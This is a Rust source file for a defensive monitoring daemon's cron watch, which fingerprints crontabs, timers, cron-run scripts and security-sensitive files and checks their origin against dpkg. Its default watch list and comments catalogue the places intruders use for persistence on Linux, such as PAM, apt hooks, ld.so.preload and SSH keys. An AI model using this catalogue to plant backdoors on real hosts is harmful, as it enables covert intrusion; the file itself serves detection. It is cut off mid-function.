//! Cron watch: scheduled tasks are the classic way for an intruder to come back after a
//! reboot or a password change, so any new or changed task is worth an admin's look.
//!
//! Every interval the daemon reads the crontabs (`/etc/crontab`, `/etc/cron.d/*`, the
//! per-user crontabs that `crontab -l` shows), the run-parts directories
//! (`/etc/cron.daily` ...), the enabled systemd timers, and the scripts that crontab lines
//! run (e.g. `/usr/local/bin/backup.sh`). During a learn period everything found is
//! accepted; afterwards every change is reported once and becomes the new baseline.
//! New or changed files are looked up in dpkg, so a task added by a package update
//! (and identical to the packaged file) reads differently from one nobody installed.

use std::collections::{BTreeMap, BTreeSet, HashMap};
use std::io::Read;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::engine::Severity;
use crate::time::{self, Dur, Micros};

#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct CronCfg {
    pub enabled: bool,
    pub interval: Dur,
    /// Changes in this period after the first scan are accepted silently ("0s" = alert at once).
    pub learn: Dur,
    /// Crontab-format files, one task per line (`*` allowed in the last path component).
    pub crontabs: Vec<String>,
    /// Directories whose every file is a task (run-parts directories, enabled timers).
    pub dirs: Vec<PathBuf>,
    /// Also watch the scripts that crontab lines run (outside the system's package directories).
    pub scripts: bool,
    /// Other files whose changes are reported: the usual ways back into a broken-in server
    /// besides cron (SSH keys, sudoers, users, sshd settings, systemd units, preloaded
    /// libraries). `*` matches within one path component, in any component.
    pub files: Vec<String>,
    /// dpkg's database, read to tell package files apart; empty on hosts without dpkg.
    pub dpkg_db: PathBuf,
    /// No longer used (dpkg itself isn't run anymore); accepted so older configs still load.
    #[serde(skip_serializing)]
    pub dpkg: PathBuf,
}

impl Default for CronCfg {
    fn default() -> Self {
        CronCfg {
            enabled: true,
            interval: Dur(60),
            learn: Dur(86_400),
            crontabs: ["/etc/crontab", "/etc/anacrontab", "/etc/cron.d/*", "/var/spool/cron/crontabs/*", "/var/spool/cron/*"]
                .map(String::from)
                .to_vec(),
            dirs: [
                "/etc/cron.hourly",
                "/etc/cron.daily",
                "/etc/cron.weekly",
                "/etc/cron.monthly",
                "/etc/cron.yearly",
                "/etc/systemd/system/timers.target.wants",
            ]
            .map(PathBuf::from)
            .to_vec(),
            scripts: true,
            files: [
                "/etc/passwd",
                "/etc/shadow",
                "/etc/group",
                "/etc/sudoers",
                "/etc/sudoers.d/*",
                "/etc/ssh/sshd_config",
                "/etc/ssh/sshd_config.d/*",
                "/root/.ssh/authorized_keys",
                "/root/.ssh/authorized_keys2",
                "/home/*/.ssh/authorized_keys",
                "/home/*/.ssh/authorized_keys2",
                // the keys of hardened hosts (`AuthorizedKeysFile /etc/ssh/authorized_keys/%u`)
                "/etc/ssh/authorized_keys/*",
                "/etc/ld.so.preload",
                "/etc/ld.so.conf.d/*",
                "/etc/rc.local",
                "/etc/profile.d/*",
                "/etc/environment",
                "/etc/bash.bashrc",
                "/root/.bashrc",
                "/root/.profile",
                // PAM decides who logs in; a module or line added there lets anyone in
                "/etc/pam.d/*",
                // apt runs `DPkg::Post-Invoke` hooks as root at every package change
                "/etc/apt/apt.conf.d/*",
                // run as root at every login
                "/etc/update-motd.d/*",
                // module loading and device rules run commands as root
                "/etc/modules-load.d/*",
                "/etc/modprobe.d/*",
                "/etc/udev/rules.d/*",
                "/etc/init.d/*",
                // programs installed by hand (the SSH gateway's shell, logguard itself)
                "/usr/local/bin/*",
                "/usr/local/sbin/*",
                "/etc/systemd/system/*",
                "/etc/systemd/system/*.wants/*",
                "/etc/systemd/system/*.d/*.conf",
            ]
            .map(String::from)
            .to_vec(),
            dpkg_db: "/var/lib/dpkg".into(),
            dpkg: PathBuf::new(),
        }
    }
}

/// One watched thing. Lines and crontab files have no fingerprint; tasks and scripts are
/// fingerprinted by content.
#[derive(Clone, Debug, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Key {
    /// A crontab-format file exists.
    Crontab(String),
    /// A task line in a crontab-format file (whitespace normalised).
    Line(String, String),
    /// A file in a run-parts directory (or an enabled timer).
    Task(String),
    /// A script run by a crontab line.
    Script(String),
    /// A file from `[cron] files`.
    File(String),
}

impl Key {
    pub fn path(&self) -> &str {
        match self {
            Key::Crontab(p) | Key::Line(p, _) | Key::Task(p) | Key::Script(p) | Key::File(p) => p,
        }
    }
}

#[derive(Clone, Debug, Default)]
pub struct CronReport {
    pub scanned: Micros,
    /// Key -> content fingerprint ("" for lines and crontab files).
    pub items: BTreeMap<Key, String>,
    /// Where a file came from, for files whose content changed since the previous scan.
    pub origins: BTreeMap<String, Origin>,
    /// Which crontab runs each script.
    pub script_refs: BTreeMap<String, String>,
    /// The `files` pattern each watched file was found by, and all configured patterns.
    pub file_patterns: BTreeMap<String, String>,
    pub patterns: Vec<String>,
    pub errors: Vec<String>,
    /// Path -> fingerprint an installer announced (`logguard expect-change`): a change to
    /// exactly that content is logged, not alerted.
    pub expected: BTreeMap<String, String>,
    /// Path -> the local user who could change it (see [`changed_by`]); paths only root can
    /// change are left out. Paths gone since the previous scan keep their last value.
    pub owners: BTreeMap<String, u32>,
}

/// The first user other than root who owns `path` (the link itself, or what it names) or
/// a directory above it: that user can change what the path holds. None when only root can.
pub fn changed_by(path: &Path) -> Option<u32> {
    use std::os::unix::fs::MetadataExt;
    let mine = |m: std::io::Result<std::fs::Metadata>| m.ok().map(|m| m.uid()).filter(|u| *u != 0);
    mine(std::fs::symlink_metadata(path))
        .or_else(|| mine(std::fs::metadata(path)))
        .or_else(|| path.ancestors().skip(1).find_map(|d| mine(std::fs::symlink_metadata(d))))
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Origin {
    /// Owned by a package and identical to the packaged file.
    Package(String),
    /// Owned by a package, but its content differs from what the package installed.
    ModifiedPackage(String),
    /// Not installed by any package.
    Local,
}

impl Origin {
    fn describe(&self) -> String {
        match self {
            Origin::Package(p) => format!("installed by package {p}, unmodified"),
            Origin::ModifiedPackage(p) => format!("from package {p}, but modified since installation"),
            Origin::Local => "not from any package".into(),
        }
    }
}

// ------------------------------------------------------------------ crontab parsing

fn is_env_assignment(line: &str) -> bool {
    let first = line.split_whitespace().next().unwrap_or("");
    let name = first.split('=').next().unwrap_or("");
    line.contains('=')
        && !name.is_empty()
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        && !name.starts_with(|c: char| c.is_ascii_digit())
}

/// The task lines of a crontab-format file: no comments or blank lines, whitespace collapsed.
/// Environment assignments (`PATH=...`, `MAILTO=...`) count too: changing them changes what runs.
pub fn entries(text: &str) -> Vec<String> {
    text.lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        // (any user writes their own crontab: no control characters into alerts and terminals)
        .map(|l| l.split_whitespace().collect::<Vec<_>>().join(" ").chars().filter(|c| !c.is_control()).take(MAX_LINE_LEN).collect())
        .collect()
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum Format {
    /// `m h dom mon dow command` (per-user crontabs).
    User,
    /// `m h dom mon dow user command` (`/etc/crontab`, `/etc/cron.d/*`).
    System,
    /// `period delay job-id command` (`/etc/anacrontab`).
    Anacron,
}

fn format_of(path: &str) -> Format {
    if path.ends_with("anacrontab") {
        Format::Anacron
    } else if path.ends_with("/etc/crontab") || path.contains("/cron.d/") {
        Format::System
    } else {
        Format::User
    }
}

/// The command part of a task line.
fn command_of(line: &str, format: Format) -> Option<String> {
    if is_env_assignment(line) {
        return None;
    }
    let skip = match format {
        Format::Anacron => 3,
        _ if line.starts_with('@') => 1,
        _ => 5,
    } + usize::from(format == Format::System);
    let words: Vec<&str> = line.split_whitespace().collect();
    (words.len() > skip).then(|| words[skip..].join(" "))
}

const INTERPRETERS: [&str; 10] = ["sh", "bash", "dash", "zsh", "python", "python3", "perl", "php", "ruby", "node"];
/// Run the command that follows; their options (and option values that are numbers) are skipped.
const WRAPPERS: [&str; 9] = ["nice", "ionice", "nohup", "exec", "chronic", "time", "setsid", "stdbuf", "command"];
/// Package-managed locations: their files change with every upgrade and dpkg vouches for them.
/// And the kernel's: devices and pseudo-files are no scripts, and are never opened.
const SYSTEM_DIRS: [&str; 11] =
    ["/bin/", "/sbin/", "/usr/bin/", "/usr/sbin/", "/usr/lib/", "/lib/", "/usr/share/", "/usr/libexec/", "/dev/", "/proc/", "/sys/"];

/// The program one simple command runs, looking through wrappers: `sudo -u x /opt/a.sh`,
/// `flock -n /run/lock /opt/a.sh`, `timeout 1h /opt/a.sh`, `env A=1 /opt/a.sh`,
/// `nice -n 19 bash /opt/a.sh`. None for inline code (`sh -c '...'`, `python -m x`).
fn program_of<'a>(words: &[&'a str]) -> Option<&'a str> {
    let mut i = 0;
    // Skips options; `with_value` lists those that take a separate value.
    let skip_options = |i: &mut usize, with_value: &[&str]| {
        while let Some(w) = words.get(*i).filter(|w| w.starts_with('-')) {
            *i += 1;
            if with_value.contains(w) {
                *i += 1;
            }
        }
    };
    while let Some(&w) = words.get(i) {
        let base = w.rsplit('/').next().unwrap_or(w);
        if is_env_assignment(w) {
            i += 1;
            continue;
        }
        match base {
            "sudo" | "doas" => {
                i += 1;
                skip_options(&mut i, &["-u", "-g", "-C", "-D", "-h", "-p", "-r", "-t", "-U", "-T"]);
            }
            "flock" => {
                i += 1;
                skip_options(&mut i, &["-w", "-E", "--timeout", "--wait", "--conflict-exit-code"]);
                if words.get(i).is_some_and(|w| *w == "-c" || *w == "--command") {
                    return None;
                }
                i += 1; // the lock file
            }
            "timeout" => {
                i += 1;
                skip_options(&mut i, &["-s", "-k", "--signal", "--kill-after"]);
                i += 1; // the duration
            }
            "env" => {
                i += 1;
                skip_options(&mut i, &["-u", "-C", "--unset", "--chdir"]);
            }
            b if WRAPPERS.contains(&b) => {
                i += 1;
                while words.get(i).is_some_and(|w| w.starts_with('-') || w.bytes().all(|c| c.is_ascii_digit())) {
                    i += 1;
                }
            }
            b if INTERPRETERS.contains(&b) => {
                i += 1;
                while let Some(o) = words.get(i).filter(|w| w.starts_with('-')) {
                    if matches!(*o, "-c" | "-m" | "-e" | "-r") {
                        return None; // inline code, not a file
                    }
                    i += 1;
                }
                return words.get(i).copied();
            }
            _ => return Some(w),
        }
    }
    None
}

/// Absolute paths of the programs a cron command runs (`/usr/local/bin/x.sh`,
/// `bash /opt/job.sh`, `cd /opt/app && ./run.sh`), outside the system's package
/// directories. Redirect targets and arguments are not programs and are skipped.
pub fn scripts_in(cmd: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let mut cwd: Option<String> = None;
    let cmd = cmd.replace("&&", ";").replace("||", ";").replace('|', ";");
    for segment in cmd.split(';') {
        let words: Vec<&str> = segment.split_whitespace().map(|w| w.trim_matches(|c| c == '"' || c == '\'')).collect();
        if words.first() == Some(&"cd") {
            cwd = words.get(1).filter(|d| d.starts_with('/')).map(|d| d.trim_end_matches('/').to_string());
            continue;
        }
        let Some(p) = program_of(&words) else { continue };
        let path = if p.starts_with('/') {
            Some(p.to_string())
        } else if p.contains('/') {
            cwd.as_ref().map(|d| format!("{d}/{}", p.trim_start_matches("./")))
        } else {
            None
        };
        if let Some(path) = path.filter(|p| !SYSTEM_DIRS.iter().any(|d| p.starts_with(d))) {
            if !out.contains(&path) {
                out.push(path);
            }
        }
    }
    out
}

// ------------------------------------------------------------------ scanning

/// Editor swap files, package manager leftovers and dotfiles: never run by cron or run-parts.
fn transient(name: &str) -> bool {
    name.starts_with('.')
        || name.ends_with('~')
        || [".swp", ".swx", ".tmp"].iter().any(|s| name.ends_with(s))
        || name.contains(".dpkg-")
        || name.contains(".ucf-")
}

const MAX_HASHED: u64 = 16 << 20;
/// Lines per crontab watched one by one; a longer one (any user can write their own
/// crontab) is watched as a whole, so it can't bloat the baseline.
const MAX_LINES: usize = 500;
const MAX_LINE_LEN: usize = 1000;

/// How long an announced change stays expected: long enough for an install that is
/// started, interrupted and finished later, short enough that an old announcement can't
/// cover a file that is put back years on.
pub const EXPECT_TTL: Micros = 7 * 86_400 * time::SEC;
const MAX_EXPECTED: usize = 1000;

/// The announced changes, next to the state file (root-only, like the state itself).
pub fn expected_path(state_file: &Path) -> PathBuf {
    state_file.with_file_name("expected-changes")
}

/// Announced changes younger than [`EXPECT_TTL`]: path -> fingerprint. One per line,
/// `<micros> <sha256> <path>`; a missing or unreadable file is no announcement.
pub fn load_expected(path: &Path, now: Micros) -> BTreeMap<String, String> {
    let text = read_small(path).unwrap_or_default();
    let mut out = BTreeMap::new();
    for line in text.lines() {
        let mut f = line.splitn(3, ' ');
        let (Some(ts), Some(fp), Some(p)) = (f.next().and_then(|t| t.parse::<Micros>().ok()), f.next(), f.next()) else { continue };
        if now - ts < EXPECT_TTL && ts <= now + 60 * time::SEC && fp.len() == 64 && p.starts_with('/') {
            out.insert(p.to_string(), fp.to_string());
        }
    }
    out
}

/// Adds announcements (path, fingerprint) to the file: replaces older ones for the same
/// paths and drops expired ones, then writes the file anew (mode 0600).
pub fn record_expected(path: &Path, new: &[(String, String)], now: Micros) -> std::io::Result<()> {
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;
    if let Some((p, _)) = new.iter().find(|(p, _)| !p.starts_with('/') || p.contains(['\n', '\r'])) {
        return Err(std::io::Error::other(format!("not an absolute one-line path: {p:?}")));
    }
    let text = read_small(path).unwrap_or_default();
    let mut lines: Vec<&str> = text
        .lines()
        .filter(|l| {
            let mut f = l.splitn(3, ' ');
            let ts = f.next().and_then(|t| t.parse::<Micros>().ok());
            let p = f.nth(1);
            ts.is_some_and(|t| now - t < EXPECT_TTL) && p.is_some_and(|p| !new.iter().any(|(n, _)| n == p))
        })
        .collect();
    let added: Vec<String> = new.iter().map(|(p, fp)| format!("{now} {fp} {p}")).collect();
    lines.extend(added.iter().map(String::as_str));
    let keep = lines.len().saturating_sub(MAX_EXPECTED);
    let tmp = path.with_extension("tmp");
    let mut f = std::fs::OpenOptions::new().write(true).create(true).truncate(true).mode(0o600).open(&tmp)?;
    for l in &lines[keep..] {
        writeln!(f, "{l}")?;
    }
    f.sync_all()?;
    std::fs::rename(&tmp, path)
}

/// Opens a regular file, and nothing else: script paths come from crontab lines, which any
/// user can write. Opening a FIFO would hang the scan, and opening a device can do
/// something (start a watchdog, or make a terminal the daemon's controlling one, whose
/// hangup would stop it). So the path is checked first, and opened without blocking, as no
/// controlling terminal, and only if it is still the same file.
pub(crate) fn open_regular(path: &Path) -> std::io::Result<std::fs::File> {
    use std::os::unix::fs::{MetadataExt, OpenOptionsExt};
    const O_NONBLOCK: i32 = if cfg!(target_os = "linux") { 0o4000 } else { 0x0004 };
    const O_NOCTTY: i32 = if cfg!(target_os = "linux") { 0o400 } else { 0x20000 };
    let before = std::fs::metadata(path)?;
    if !before.is_file() {
        return Err(std::io::Error::other("not a regular file"));
    }
    let f = std::fs::OpenOptions::new().read(true).custom_flags(O_NONBLOCK | O_NOCTTY).open(path)?;
    let m = f.metadata()?;
    if !m.is_file() || (m.dev(), m.ino()) != (before.dev(), before.ino()) {
        return Err(std::io::Error::other("replaced while being opened"));
    }
    Ok(f)
}

/// Identity of a file version: any write changes ctime, which (unlike mtime) can't be set back.
type Stamp = (u64, u64, u64, i64, i64);

fn stamp(m: &std::fs::Metadata) -> Stamp {
    use std::os::unix::fs::MetadataExt;
    (m.dev(), m.ino(), m.len(), m.ctime(), m.ctime_nsec())
}

/// Bytes hashed of a file root owns: all of a large program (a change past its first 16 MB
/// must show too). Only root writes those, so nobody else can make the watch hash them again
/// and again; a user's own file (a script their crontab runs) is hashed up to `MAX_HASHED`.
const MAX_HASHED_ROOT: u64 = 1 << 30;

fn hashed_bytes(uid: u32) -> u64 {
    if uid == 0 {
        MAX_HASHED_ROOT
    } else {
        MAX_HASHED
    }
}

/// SHA-256 of a file's content (the start of bigger ones, plus their size: see
/// [`hashed_bytes`]).
pub fn fingerprint(path: &Path) -> std::io::Result<String> {
    use std::os::unix::fs::MetadataExt;
    let f = open_regular(path)?;
    let meta = f.metadata()?;
    let (len, max) = (meta.len(), hashed_bytes(meta.uid()));
    let mut h = Sha256::new();
    let mut r = f.take(max);
    let mut buf = vec![0u8; 64 << 10];
    loop {
        let n = r.read(&mut buf)?;
        if n == 0 {
            break;
        }
        h.update(&buf[..n]);
    }
    if len > max {
        h.update(len.to_le_bytes());
    }
    Ok(h.finalize().iter().map(|b| format!("{b:02x}")).collect())
}

fn read_small(path: &Path) -> std::io::Result<String> {
    let mut s = Vec::new();
    open_regular(path)?.take(4 << 20).read_to_end(&mut s)?;
    Ok(String::from_utf8_lossy(&s).into_owned())
}

/// Paths matching `pattern`, with `*` allowed in any component (`/home/*/.ssh/authorized_keys`).
/// A `*` doesn't match names starting with a dot unless the pattern part does.
pub fn expand_glob(pattern: &str) -> Vec<PathBuf> {
    let mut paths = vec![PathBuf::from("/")];
    for part in pattern.split('/').filter(|p| !p.is_empty()) {
        let mut next = Vec::new();
        for dir in &paths {
            if !part.contains('*') {
                next.push(dir.join(part));
                continue;
            }
            let Ok(rd) = std::fs::read_dir(dir) else { continue };
            for e in rd.flatten() {
                let name = e.file_name().to_string_lossy().into_owned();
                if (part.starts_with('.') || !name.starts_with('.')) && crate::digest::wildcard_match(part, &name) {
                    next.push(e.path());
                }
            }
        }
        paths = next;
        if paths.len() > 10_000 {
            break; // a pattern like /*/*/* is a configuration mistake
        }
    }
    paths.sort();
    paths
}

/// Whether `path` matches `pattern` (component by component, `*` within one component).
pub fn pattern_matches(pattern: &str, path: &str) -> bool {
    let (a, b): (Vec<&str>, Vec<&str>) = (pattern.split('/').collect(), path.split('/').collect());
    a.len() == b.len() && a.iter().zip(&b).all(|(p, n)| crate::digest::wildcard_match(p, n))
}

/// What a watched file that can't be hashed is: a symlink to /dev/null (a masked unit), a
/// dangling symlink (a removed unit still enabled). None = a real read error.
fn symlink_value(path: &Path) -> Option<String> {
    path.is_symlink().then(|| match std::fs::read_link(path) {
        Ok(t) => format!("symlink to {}", t.display()),
        Err(_) => "symlink".to_string(),
    })
}

/// Keeps the previous scan's fingerprints, so dpkg is only asked about files that changed
/// and unchanged files aren't read again.
#[derive(Default)]
pub struct Scanner {
    known: HashMap<String, (String, Origin)>,
    hashes: HashMap<String, (Stamp, String)>,
    /// The previous scan's `CronReport::owners`, for what is gone since.
    owners: BTreeMap<String, u32>,
}

impl Scanner {
    fn fingerprint(&mut self, path: &Path) -> std::io::Result<String> {
        let key = path.display().to_string();
        let st = stamp(&std::fs::metadata(path)?);
        if let Some((_, fp)) = self.hashes.get(&key).filter(|(s, _)| *s == st) {
            return Ok(fp.clone());
        }
        let fp = fingerprint(path)?;
        self.hashes.insert(key, (st, fp.clone()));
        Ok(fp)
    }

    pub fn scan(&mut self, cfg: &CronCfg) -> CronReport {
        let mut r = CronReport { scanned: time::now(), ..Default::default() };
        // path -> fingerprint of every file seen, for the origin lookup
        let mut files: BTreeMap<String, String> = BTreeMap::new();
        let mut seen = BTreeSet::new();
        for pattern in &cfg.crontabs {
            for path in crate::digest::expand_files(pattern) {
                let p = path.display().to_string();
                if transient(path.file_name().and_then(|n| n.to_str()).unwrap_or("")) || !seen.insert(p.clone()) {
                    continue;
                }
                match (read_small(&path), self.fingerprint(&path)) {
                    (Ok(text), Ok(fp)) => {
                        r.items.insert(Key::Crontab(p.clone()), String::new());
                        let format = format_of(&p);
                        let lines = entries(&text);
                        if lines.len() > MAX_LINES {
                            let summary = format!("({} task lines, sha256 {})", lines.len(), &fp[..16]);
                            r.items.insert(Key::Line(p.clone(), summary), String::new());
                            files.insert(p, fp);
                            continue;
                        }
                        for line in lines {
                            if cfg.scripts {
                                for s in command_of(&line, format).map(|c| scripts_in(&c)).unwrap_or_default() {
                                    r.script_refs.entry(s).or_insert_with(|| p.clone());
                                }
                            }
                            r.items.insert(Key::Line(p.clone(), line), String::new());
                        }
                        files.insert(p, fp);
                    }
                    (Err(e), _) | (_, Err(e)) => r.errors.push(format!("{p}: {e}")),
                }
            }
        }
        for dir in &cfg.dirs {
            let Ok(rd) = std::fs::read_dir(dir) else { continue };
            for e in rd.flatten() {
                let name = e.file_name().to_string_lossy().into_owned();
                let path = e.path();
                if transient(&name) || path.is_dir() {
                    continue;
                }
                let p = path.display().to_string();
                match self.fingerprint(&path) {
                    Ok(fp) => {
                        r.items.insert(Key::Task(p.clone()), fp.clone());
                        files.insert(p, fp);
                    }
                    // A dangling symlink (a timer whose unit was deleted) still matters.
                    Err(e) => match symlink_value(&path) {
                        Some(v) => {
                            r.items.insert(Key::Task(p), v);
                        }
                        None => r.errors.push(format!("{p}: {e}")),
                    },
                }
            }
        }
        r.patterns = cfg.files.clone();
        for pattern in &cfg.files {
            for path in expand_glob(pattern) {
                let p = path.display().to_string();
                let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
                // (an enabled timer is already a task)
                if transient(name) || path.is_dir() || r.items.contains_key(&Key::Task(p.clone())) || r.file_patterns.contains_key(&p) {
                    continue;
                }
                if !path.exists() && !path.is_symlink() {
                    continue; // e.g. no /etc/ld.so.preload: fine, and reported if it appears
                }
                match self.fingerprint(&path) {
                    Ok(fp) => {
                        r.items.insert(Key::File(p.clone()), fp.clone());
                        files.insert(p.clone(), fp);
                    }
                    Err(e) => match symlink_value(&path) {
                        Some(v) => {
                            r.items.insert(Key::File(p.clone()), v);
                        }
                        None => {
                            r.errors.push(format!("{p}: {e}"));
                            continue;
                        }
                    },
                }
                r.file_patterns.insert(p, pattern.clone());
            }
        }
        for script in r.script_refs.keys() {
            let fp = match self.fingerprint(Path::new(script)) {
                Ok(fp) => {
                    files.insert(script.clone(), fp.clone());
                    fp
                }
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => "missing".into(),
                Err(e) => format!("unreadable: {e}"),
            };
            r.items.insert(Key::Script(script.clone()), fp);
        }

        let changed: Vec<String> =
            files.iter().filter(|(p, fp)| self.known.get(*p).is_none_or(|(k, _)| k != *fp)).map(|(p, _)| p.clone()).collect();
        let origins =
            if changed.is_empty() || cfg.dpkg_db.as_os_str().is_empty() { HashMap::new() } else { dpkg_origins(&cfg.dpkg_db, &changed) };
        self.known.retain(|p, _| files.contains_key(p));
        self.hashes.retain(|p, _| files.contains_key(p));
        for p in changed {
            let o = origins.get(&p).cloned().unwrap_or(Origin::Local);
            r.origins.insert(p.clone(), o.clone());
            self.known.insert(p.clone(), (files[&p].clone(), o));
        }
        let paths: BTreeSet<&str> = r.items.keys().map(Key::path).collect();
        let present: BTreeMap<String, u32> = paths.iter().filter_map(|p| changed_by(Path::new(p)).map(|u| (p.to_string(), u))).collect();
        // what is gone since the last scan was its user's to remove
        let gone = std::mem::replace(&mut self.owners, present.clone()).into_iter().filter(|(p, _)| !paths.contains(p.as_str()));
        r.owners = present;
        r.owners.extend(gone);
        r
    }
}

/// Package ownership and integrity of the given files, read straight from dpkg's database
/// (`info/*.list`, `info/*.md5sums`, the `Conffiles:` of `status`), line by line. Running
/// `dpkg-query -S` / `dpkg --verify` instead would load every package's file list and hash
/// every file of the owning packages, all charged to logguard's memory limit.
/// Symlinks (enabled timers) are judged by the unit file they point to. Unknown = local.
pub(crate) fn dpkg_origins(db: &Path, paths: &[String]) -> HashMap<String, Origin> {
    use std::io::BufRead;
    // Path as dpkg may know it -> path as watched. On merged-/usr systems dpkg may list a
    // file under /lib rather than /usr/lib.
    let mut lookup: HashMap<String, String> = HashMap::new();
    for p in paths {
        let real = std::fs::canonicalize(p).map(|r| r.display().to_string()).unwrap_or_else(|_| p.clone());
        if let Some(short) = real.strip_prefix("/usr").filter(|s| ["/lib/", "/bin/", "/sbin/"].iter().any(|d| s.starts_with(d))) {
            lookup.insert(short.to_string(), p.clone());
        }
        lookup.insert(real, p.clone());
        lookup.entry(p.clone()).or_insert_with(|| p.clone());
    }
    let lines = |path: &Path| -> Vec<String> {
        std::fs::File::open(path).map(|f| std::io::BufReader::new(f).lines().map_while(Result::ok).collect()).unwrap_or_default()
    };
    let info = db.join("info");
    // owner: watched path -> (package file stem, e.g. `cron` or `libc6:amd64`, path as dpkg knows it)
    let mut owner: HashMap<String, (String, String)> = HashMap::new();
    if let Ok(rd) = std::fs::read_dir(&info) {
        for e in rd.flatten() {
            let name = e.file_name().to_string_lossy().into_owned();
            let Some(stem) = name.strip_suffix(".list") else { continue };
            let Ok(f) = std::fs::File::open(e.path()) else { continue };
            for line in std::io::BufReader::new(f).lines().map_while(Result::ok) {
                if let Some(orig) = lookup.get(&line) {
                    owner.entry(orig.clone()).or_insert_with(|| (stem.to_string(), line.clone()));
                }
            }
            if owner.len() == paths.len() {
                break;
            }
        }
    }
    if owner.is_empty() {
        return HashMap::new();
    }
    // Expected MD5s: conffiles (most of /etc) are recorded in `status`, other files in
    // the package's md5sums (paths there have no leading slash).
    let wanted: BTreeSet<&str> = owner.values().map(|(_, known)| known.as_str()).collect();
    let mut expected: HashMap<String, String> = HashMap::new();
    if let Ok(f) = std::fs::File::open(db.join("status")) {
        for line in std::io::BufReader::new(f).lines().map_while(Result::ok) {
            // conffile lines: " /etc/cron.daily/man-db 6e2e5c0b... [obsolete]"
            let mut w = line.strip_prefix(' ').unwrap_or("").split_whitespace();
            if let (Some(path), Some(md5)) = (w.next(), w.next()) {
                if wanted.contains(path) && md5.len() == 32 {
                    expected.insert(path.to_string(), md5.to_string());
                }
            }
        }
    }
    let stems: BTreeSet<&str> = owner.values().map(|(stem, _)| stem.as_str()).collect();
    for stem in stems {
        for line in lines(&info.join(format!("{stem}.md5sums"))) {
            if let Some((md5, rel)) = line.split_once("  ") {
                let path = format!("/{rel}");
                if wanted.contains(path.as_str()) {
                    expected.entry(path).or_insert_with(|| md5.to_string());
                }
            }
        }
    }
    owner
        .into_iter()
        .map(|(p, (stem, known))| {
            let pkg = stem.split(':').next().unwrap_or(&stem).to_string();
            let actual = md5_file(Path::new(&p)).ok();
            let o = match (expected.get(&known), actual) {
                (Some(want), Some(have)) if *want != have => Origin::ModifiedPackage(pkg),
                (Some(_), None) => Origin::ModifiedPackage(pkg),
                _ => Origin::Package(pkg),
            };
            (p, o)
        })
        .collect()
}

pub(crate) fn md5_file(path: &Path) -> std::io::Result<String> {
    use md5::{Digest as _, Md5};
    let mut r = open_regular(path)?;
    let mut h = Md5::new();
    let mut buf = vec![0u8; 64 << 10];
    loop {
        let n = r.read(&mut buf)?;
        if n == 0 {
            break;
        }
        h.update(&buf[..n]);
    }
    Ok(h.finalize().iter().map(|b| format!("{b:02x}")).collect())
}

// ------------------------------------------------------------------ judging

/// The accepted state, persisted across restarts.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub struct Baseline {
    /// Changes before this time are accepted silently.
    pub learning_until: Micros,
    /// Set once the end of the learn period has been announced.
    #[serde(default)]
    pub armed: bool,
    /// `files` patterns already watched: files found by a newly added pattern (or after an
    /// upgrade that brought the feature) are learned silently instead of reported as new.
    #[serde(default)]
    pub patterns: BTreeSet<String>,
    pub items: Vec<(Key, String)>,
}

/// Summary for `logguard status`.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub struct CronView {
    pub scanned: Micros,
    pub learning_until: Micros,
    pub crontabs: usize,
    pub lines: usize,
    pub tasks: usize,
    pub scripts: usize,
    #[serde(default)]
    pub files: usize,
    pub errors: Vec<String>,
}

impl CronView {
    pub fn of(r: &CronReport, b: &Baseline) -> Self {
        let count = |f: fn(&Key) -> bool| r.items.keys().filter(|k| f(k)).count();
        CronView {
            scanned: r.scanned,
            learning_until: b.learning_until,
            crontabs: count(|k| matches!(k, Key::Crontab(_))),
            lines: count(|k| matches!(k, Key::Line(..))),
            tasks: count(|k| matches!(k, Key::Task(_))),
            scripts: count(|k| matches!(k, Key::Script(_))),
            files: count(|k| matches!(k, Key::File(_))),
            errors: r.errors.clone(),
        }
    }
}

/// Something to tell the admin; the engine turns it into an alert.
#[derive(Clone, Debug, PartialEq)]
pub struct Finding {
    /// Rate-limit key: the same key is reported at most once per `every`.
    pub key: String,
    pub every: Micros,
    pub severity: Severity,
    pub message: String,
    pub evidence: Vec<String>,
    /// Notify admins (false: only logged).
    pub notify: bool,
    /// The local user (not root) whose own file or process this is about, who could have made
    /// the change: their alerts share an hourly budget (see `Engine::findings`).
    pub owner: Option<u32>,
}

fn quote(s: &str) -> String {
    let s: String = s.chars().take(160).collect();
    format!("`{s}`")
}

fn plural(n: usize, one: &str) -> String {
    if n == 1 {
        format!("1 {one}")
    } else {
        format!("{n} {one}s")
    }
}

/// Compares a scan with the baseline, updates the baseline, and says what changed.
pub fn judge(baseline: &mut Option<Baseline>, r: &CronReport, learn: Dur) -> Vec<Finding> {
    let now = r.scanned;
    let mut out = Vec::new();
    let day = 86_400 * time::SEC;
    for e in &r.errors {
        out.push(Finding {
            key: format!("cron-unreadable:{}", e.split(':').next().unwrap_or("")),
            every: day,
            severity: Severity::Warning,
            message: format!("cron watch cannot read {e}"),
            evidence: vec![],
            notify: true,
            owner: None,
        });
    }
    let Some(b) = baseline.as_mut() else {
        let until = now + learn.micros();
        *baseline = Some(Baseline {
            learning_until: until,
            armed: learn.0 == 0,
            items: r.items.iter().map(|(k, v)| (k.clone(), v.clone())).collect(),
            patterns: r.patterns.iter().cloned().collect(),
        });
        let v = CronView::of(r, baseline.as_ref().unwrap());
        let when = if learn.0 == 0 {
            "now".to_string()
        } else {
            format!("after {} (learning until {})", time::fmt_duration(learn.micros()), time::fmt_ts(until))
        };
        out.push(Finding {
            key: "cron-learn".into(),
            every: day,
            severity: Severity::Info,
            message: format!(
                "cron watch started: {} in {}, {}, {} run by cron, {}; changes are reported {when}",
                plural(v.lines, "crontab line"),
                plural(v.crontabs, "crontab"),
                plural(v.tasks, "task file"),
                plural(v.scripts, "script"),
